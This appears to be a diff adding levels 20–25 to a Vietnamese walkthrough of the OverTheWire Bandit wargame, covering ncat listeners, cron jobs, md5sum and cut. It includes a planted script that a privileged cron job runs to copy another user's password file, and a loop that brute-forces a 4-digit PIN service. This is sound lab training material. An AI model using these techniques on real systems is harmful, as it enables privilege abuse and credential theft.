@@ -1,4 +1,4 @@
-# OverTheWire Bandit – Walkthrough (Level 0 → 20)
+# OverTheWire Bandit – Walkthrough (Level 0 → 25)
 
 ## Mục lục
 
@@ -23,6 +23,11 @@
 - [Level 17 → 18](#level-17--18)
 - [Level 18 → 19](#level-18--19)
 - [Level 19 → 20](#level-19--20)
+- [Level 20 → 21](#level-20--21)
+- [Level 21 → 22](#level-21--22)
+- [Level 22 → 23](#level-22--23)
+- [Level 23 → 24](#level-23--24)
+- [Level 24 → 25](#level-24--25)
 
 ---
 
@@ -642,3 +647,251 @@ Tùy chọn lệnh ở cuối sẽ đọc file readme rồi thoát luôn chứ k
 
    `setuid` là đặt biệt cho phép bạn tạm thời dùng quyền của chủ sở hữu file bandit20-do để chạy 1 lệnh nào đó thay vì quyền user của bạn.
 2. Dùng lệnh: `./bandit20-do cat /etc/bandit_pass/bandit20` để đọc pass.
+
+---
+
+## Level 20 → 21
+
+**Goal:** Mở 1 port để lắng nghe và để pass của level trước vào sau đó dùng file suconnect để kết nối tới port đó. Nếu mật khẩu level trước trùng khớp thì sẽ trả về mật khẩu tiếp theo.
+
+**Step:**
+
+1. Dùng lệnh: `echo "pass_bandit20" | ncat -l -p 2026 &`. Mở port 2026 để lắng nghe và đưa pass_bandit20 đó.
+2. Dùng lệnh: `/suconnect 2026`. Kết nối đến port 2026 để suconnect kiểm tra pass_bandit20. Nếu nó khớp thì sẽ trả về pass tiếp theo.
+
+Dấu `&` thể hiện là bạn đưa tiến trình này xuống chạy ngầm, xong nó sẽ hiện (VD `[1] 217`). Đây thể hiện tiến trình đang chạy ngầm. Nếu không làm như vậy nó sẽ chiếm dụng terminal, buộc bạn phải làm xong việc rồi tắt nó đi mới dùng lệnh tiếp theo được.
+
+**Các lệnh hay dùng để xử lý tiếng trình:**
+
+| Lệnh | Ý nghĩa |
+|------|---------|
+| `jobs` | Liệt kê các tiến trình đang chạy ngầm trong session hiện tại. |
+| `fg %1` | Đưa tiến trình vị trí số 1 từ background trở lại foreground. |
+| `bg %1` | Tiếp tục chạy tiến trình số 1 ở background nếu nó đang bị tạm dừng (Paused). |
+| `kill %1` hoặc `kill PID` | Dừng/xóa tiến trình ngầm (rất hữu ích nếu mở nhầm port hoặc port bị chiếm). |
+
+Ngoài ra nếu dùng ncat còn có 1 tham số khác là `-k` (Keep-alive): Giữ cho ncat tiếp tục lắng nghe không bị ngắt giữa chừng
+
+---
+
+## Level 21 → 22
+
+**Goal:** kiểm tra trong thư mục `etc/cron.d/` để tìm pass cho level tiếp theo.
+
+### Cron job
+
+Cron job là 1 trương trình giúp bạn làm những công việc lặp đi lặp lại vào 1 khoản thời gian cố định, ví dụ bình thường cứ sau mỗi 3 ngày bạn phải xóa các file tmp để giả phóng bộ nhớ thì thay vì phải tự làm việc đó thì bạn setup cho cron cứ sau 3 ngày thì tự động xóa file tmp.
+
+File cron là file text đơn giản chứa các lệnh được chạy trong thời gian cụ thể. File crontab mặc định trong hệ thống là `/etc/crontab` và nằm trong thư mục crontab `/etc/cron.*/`. Chỉ quản trị viên hệ thống mới có thể chỉnh sửa file crontab trên hệ thống.
+
+**Cấu tạo:**
+
+```
+* * * * * command
+```
+
+- dấu `*` thứ nhất chỉ phút (tham số từ 0 đến 59)
+- dấu `*` thứ hai chỉ giờ (tham số từ 0 đến 23)
+- dấu `*` thứ ba chỉ ngày (tham số từ 1 đến 31)
+- dấu `*` thứ tư chỉ tháng (tham số từ 1 đến 12)
+- dấu `*` thứ năm chỉ thứ (tham số từ 0 đến 7) (Lưu ý số 0 là CN, số 1 là T2,... số 6 là T7, số 7 là CN)
+
+Ngoài ra còn các cú pháp chi tiết hơn như sau:
+
+| Ký tự | Ý nghĩa |
+|-------|---------|
+| `*` (dấu hoa thị) | để xác định tất cả tham số được lên lịch (VD dấu `*` ở vị trí đầu nghĩa là chạy mỗi phút từ 0 đến 59) |
+| `,` (dấu phẩy) | Để ngăn cách các giá trị cụ thể (VD vị trí thứ 2 là `1,10,20` thì nghĩa là chạy vào lúc 1h, 10h và 20h) |
+| `-` (dấu gạch nối) | Để xác định 1 khoản tham số liên tục (VD ở vị trí thứ 3 là `2-5` nghĩa là chạy vào các ngày 2,3,4,5) |
+| `/` (dấu gạch chéo) | Để xác định khoản nghỉ (VD vị trí thứ 4 là `*/2` là cứ mỗi 2 tháng chạy 1 lần) |
+| `L` | Cuối cùng (L) – cho mục đích cụ thể là chỉ định ngày cuối cùng của tuần trong tháng. Ví dụ, `3L` nghĩa là thứ tư cuối cùng. |
+
+**Các phím tắt nhanh (Shortcuts)**
+
+Thay vì viết 5 trường thời gian bằng số, bạn có thể dùng các chuỗi ký tự đặc biệt có sẵn:
+
+| Shortcut | Ý nghĩa |
+|----------|---------|
+| `@reboot` | Chạy một lần duy nhất ngay khi hệ thống vừa khởi động. |
+| `@hourly` | Chạy vào phút đầu tiên của mỗi giờ (tương đương `0 * * * *`). |
+| `@daily` hoặc `@midnight` | Chạy vào lúc 00:00 mỗi ngày (tương đương `0 0 * * *`). |
+| `@weekly` | Chạy vào lúc 00:00 ngày Chủ Nhật hàng tuần (tương đương `0 0 * * 0`). |
+| `@monthly` | Chạy vào lúc 00:00 ngày đầu tiên của mỗi tháng (tương đương `0 0 1 * *`). |
+| `@yearly` | Chạy vào lúc 00:00 ngày 1 tháng 1 hàng năm (tương đương `0 0 1 1 *`) |
+
+**Lệnh quản lý Cron Job**
+
+Để cấu hình cron, bạn sử dụng công cụ điều khiển crontab với các tùy chọn sau:
+
+| Lệnh | Ý nghĩa |
+|------|---------|
+| `crontab -e` | Mở trình chỉnh sửa để thêm, sửa hoặc xóa các cron job. |
+| `crontab -l` | Xem danh sách các cron job hiện có của bạn. |
+| `crontab -r` | Xóa toàn bộ các cấu hình cron job hiện có. |
+
+### Các bước tìm mật khẩu
+
+1. Dùng lệnh: `cd etc/cron.d/` để vào trong thư mục chứa cron cần tìm:
+2. Dùng lệnh: `ls -l` để tìm đúng cron job: `-rw-r--r-- 1 root root 120 Sep 26 21:53 cronjob_bandit22`. Vì mình cần tìm pass lên level 22 nên cronjob_bandit22 là file con job mình cần
+3. Dùng lệnh `cat cronjob_bandit22` ta sẽ thấy:
+
+   ```
+   @reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+   * * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+   ```
+
+   ta sẽ thấy corn này chạy lệnh file script `/usr/bin/cronjob_bandit22.sh` khi hệ thống khởi động và mỗi phút 1 lần liên tục và ném stdout và stderr và "hố đen" để không hiện lên màn hình terminal.
+4. Dùng lệnh: `cat /usr/bin/cronjob_bandit22.sh` để đọc đoạn script và cron job chạy:
+
+   ```bash
+   #!/bin/bash
+   chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+   cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+   ```
+
+   Đoạn script thực hiện cấu quền 644 cho file `/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv` và xuất pass của bandit22 vào file tmp này.
+5. Dùng lệnh: `cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv` để đọc mật khẩu
+
+---
+
+## Level 22 → 23
+
+**Goal:** kiểm tra trong thư mục `etc/cron.d/` để tìm pass cho level tiếp theo.
+
+### `cut`
+
+lệnh `cut` trong linux dùng để cắt hoặc trích xuất 1 dữ liệu từ mỗi trong file hoặc từ input dựa trên ký tự, bytes, hoặc trường được phân cách bởi dấu phân cách.
+
+Cấu trúc: `cut OPTION FILE`
+
+| OPTION | Ý nghĩa |
+|--------|---------|
+| `-c` (Characters) | chọn số lượng ký tự (An toàn với Tiếng Việt) |
+| `-b` (bytes) | chọn theo số lượng bytes (Tiếng việt có dấu hoặc emoji có thể chiếm từ 2 đến 4 bytes nên khi cắt theo bytes rất dễ bị lỗi hiển thị) |
+| `-f` (Fields) | Cắt theo cột/trường dựa trên một ký tự phân tách (mặc định là ký tự Tab). |
+| `-d` (Delimiter) | Thay đổi ký tự phân tách cột (mặc định là Tab). |
+
+### `md5sum`
+
+`md5sum` là một công cụ dòng lệnh trên Linux được sử dụng để tính toán và kiểm tra mã băm (checksum) MD5 của một tệp tin
+
+### Step
+
+1. Dùng lệnh: `cat /etc/cron.d/cronjob_bandit23` để đọc corn:
+
+   ```
+   @reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+   * * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+   ```
+
+   Ta sẽ thấy cron này chạy script `/usr/bin/cronjob_bandit23.sh`
+2. `cat /usr/bin/cronjob_bandit23.sh` để đọc script:
+
+   ```bash
+   #!/bin/bash
+   myname=$(whoami)
+   mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+   echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+   cat /etc/bandit_pass/$myname > /tmp/$mytarget
+   ```
+
+   `whoami` là câu lệnh trả về tên người trực tiếp chạy script đó (ở đây là bandit23)
+
+   `echo I am user $myname | md5sum | cut -d ' ' -f 1`. Nghĩa là đưa dòng chữ "I am user bandit23" vào hàm băm md5 rồi lấy trường thứ nhất (`-f 1`) được phân cách bởi đấu space (`-d' '`). Gán mã băm đó vào biến mytarget. rồi xuất pass của level 22 vào file `/tmp/$mytarget`
+3. Dùng lệnh: `md5sum <<<"I am user bandit23" | cut -d' ' -f 1` để tìm ra tên của file tmp chứa pass: ta được `8ca319486bfbbc3663ea0fbe81326349`
+4. Dùng lệnh: `cat /tmp/8ca319486bfbbc3663ea0fbe81326349` để tìm ra pass
+
+---
+
+## Level 23 → 24
+
+**Goal:** kiểm tra trong thư mục `etc/cron.d/` để tìm pass cho level tiếp theo.
+
+```bash
+!/bin/bash
+shopt -s nullglob
+myname=$(whoami)
+cd /var/spool/"$myname"/foo || exit
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." ] && [ "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" "./$i")"
+        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
+            timeout -s 9 60 "./$i"
+        fi
+        rm -rf "./$i"
+    fi
+done
+```
+
+Đoạn script trên sẽ vào thư mục `/var/spool/bandit24/foo` và kiểm tra tất cả các file thông thường có owner là banidit23 nếu đúng thì sẽ chạy file đó trong đúng 60s. Nếu sau 60s mà script chưa chạy xong thì lặp tức cưỡng chế ngừng (kill) ngay lặp tức. Sau đó xóa vĩnh viễn file đó mà không cần thông báo.
+
+### Step
+
+2. Dùng lệnh: `ls -l /var/spool/bandit24` ta sẽ thấy folder foo sẽ có quyền:
+
+   ```
+   drwxrwx-wx 5 root bandit24 4096 Oct  8 12:15 foo
+   ```
+
+   Trong đó others sẽ có quyền `-wx`, nghĩa là ta chỉ có quyền thực thi và viết vào folder đó chứ không được đọc (`ls`) folder đó.
+3. Dùng lệnh: `mktemp -d` Để tạo ra 1 thư mục temp `/tmp/tmp.K01gtbZysr`
+4. Dùng lệnh: `chmod 777 /tmp/tmp.K01gtbZysr` để cấp quyền cho others và group có quyền đọc, viết, thực thi vào thư mục đó. Chủ yếu là quyền read của others vì khi đưa file vào thư mục `/var/spool/bandit24/foo`, thư mục sẽ chạy dưới quyền của bandit24, nên ta cần cho bandit24 được phép viết vào thư mục tmp.
+5. Dùng lệnh: `nano /tmp/tmp.K01gtbZysr/hack.sh` và viết vào trong đó đoạn script:
+
+   ```bash
+   #!/bin/bash
+   cat /etc/bandit_pass/bandit24 > /tmp/tmp.K01gtbZysr/pass.txt
+   ```
+
+   Do file này sẽ chạy dưới quyền của bandit24 nên ta có thể đọc được password của bandit24
+6. Dùng lệnh: `chmod 755 /tmp/tmp.K01gtbZysr/hack.sh` để cấp quyền thực thi để chạy file
+7. Dùng lệnh: `cp /tmp/tmp.K01gtbZysr/hack.sh /var/spool/bandit24/foo` để đưa file hack.sh vào thư mục `/var/spool/bandit24/foo`.
+8. Dùng lệnh: `cat /tmp/tmp.K01gtbZysr/pass.txt` Sau 1 phút đọc file `/tmp/tmp.K01gtbZysr/pass.txt` để lấy pass
+
+---
+
+## Level 24 → 25
+
+**Goal:** Gửi mật khẩu level hiện tại cộng với 1 mã pin 4 số cách nhau bởi dấu cách (space) đến port 30002. Và ta không biết mã pin là bao nhiêu chỉ biết mã pin nằm trong khoản 0000 đến 9999.
+
+**Step:**
+
+1. Dùng lệnh: `echo "pass_bandit24 0000" | ncat localhost 30002` để kiểm tra thử xem nó sẽ trả lời thế nào:
+
+   ```
+   I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+   Wrong! Please enter the correct current password and pincode. Try again.
+   ```
+
+2. Dùng lệnh: `nano /tmp/bruteforce.sh` Để tạo ra 1 file script:
+
+   ```bash
+   #!/bin/bash
+   pass24=pass_bandit24
+   for i in {0000..9999}
+   do
+       echo "$pass24" "$i" | ncat localhost 30002 > /tmp/pass.txt
+       if ! grep -q "Try again" /tmp/pass.txt;then
+           cat /tmp/pass.txt
+           break
+       fi
+   done
+   ```
+
+   Đoạn script này sẽ tạo ra 1 vòng lặp chạy từ 0000 đến 9999 để thử mã pin, sau đó đưa pass pin lên port 30002 rồi đưa kết quả nó trả về vào file `/tmp/pass.txt`. Vì đã thử ở trên, nếu nó sai thì sẽ hiện "Try again" nên nếu đến mã pin nào không có "Try again" thì đó là mã pin có pass và nó sẽ in kết quả chứa pass ra:
+
+   ```
+   I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+   Correct!
+   The password of user bandit25 is pass_bandit25
+   ```
+
+> **Lưu ý:** trước khi chạy `/tmp/bruteforce.sh` thì cần cấp quyền thực thi (x) cho nó trước:
+>
+> ```bash
+> chmod +x /tmp/bruteforce.sh
+> ```
